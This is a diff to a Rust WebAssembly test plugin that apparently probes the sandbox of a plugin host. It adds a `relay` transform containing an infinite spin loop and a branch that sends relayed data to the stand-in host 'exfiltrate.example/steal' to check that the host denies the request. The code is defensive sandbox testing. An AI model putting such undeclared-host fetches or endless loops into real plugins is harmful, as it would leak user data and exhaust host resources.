@@ -11,6 +11,7 @@
 //! | `resolve` | Allocates without bound — the memory ceiling must stop it. |
 //! | `sources` | Reads a setting it was never granted — the host must answer `none`. |
 //! | `describe` | Declares one innocuous host, so the denial above is a real escape attempt. |
+//! | `relay` `transform` | Spins on a `/spin` URL and fetches an undeclared host on an `/escape` one; any other part gains the prefix `relayed:`, so the host's plumbing can be seen to carry the bytes there and back. |
 //!
 //! Note what it does *not* need to try: opening a socket, reading a file, or reading an
 //! environment variable. Those are not in the WIT world, so there is no function to call — the
@@ -20,7 +21,7 @@
 mod bindings {
     wit_bindgen::generate!({
         path: "../../wit/kaeri-provider.wit",
-        world: "plugin",
+        world: "plugin-with-relay",
     });
 }
 
@@ -28,6 +29,7 @@ use bindings::{
     exports::kaeri::provider::provider::{
         Episode, Guest, Manifest, MediaStream, ProviderError, SearchHit, SourceCandidate, TitleHints,
     },
+    exports::kaeri::provider::relay::{Guest as Relay, Relayed},
     kaeri::provider::host,
 };
 
@@ -43,7 +45,7 @@ impl Guest for Component {
             // what makes that an escape attempt rather than a mistake.
             allowed_hosts: vec!["allowed.example".into()],
             translation_types: vec!["sub".into()],
-            capabilities: vec![],
+            capabilities: vec!["transform-keys".into(), "transform-segments".into()],
         }
     }
 
@@ -120,6 +122,35 @@ impl Guest for Component {
         _source_id: String,
     ) -> Result<Vec<MediaStream>, ProviderError> {
         Err(ProviderError::NotFound)
+    }
+}
+
+impl Relay for Component {
+    /// Spins, escapes, or prefixes, by the URL it is asked about.
+    fn transform(relayed: Relayed) -> Result<Vec<u8>, String> {
+        if relayed.url.ends_with("/spin") {
+            let mut spin: u64 = 0;
+            loop {
+                spin = spin.wrapping_add(1);
+                std::hint::black_box(spin);
+            }
+        }
+        if relayed.url.ends_with("/escape") {
+            let result = host::fetch(&host::HttpRequest {
+                method: "GET".into(),
+                url: "https://exfiltrate.example/steal".into(),
+                headers: vec![],
+                body: Some(relayed.body),
+            });
+            return match result {
+                Err(host::HostError::Denied(m)) => Err(format!("denied: {m}")),
+                Err(other) => Err(format!("not-denied: {other:?}")),
+                Ok(_) => Err("ESCAPED: the fetch succeeded".into()),
+            };
+        }
+        let mut out = format!("relayed:{}:", relayed.part).into_bytes();
+        out.extend(relayed.body);
+        Ok(out)
     }
 }
 
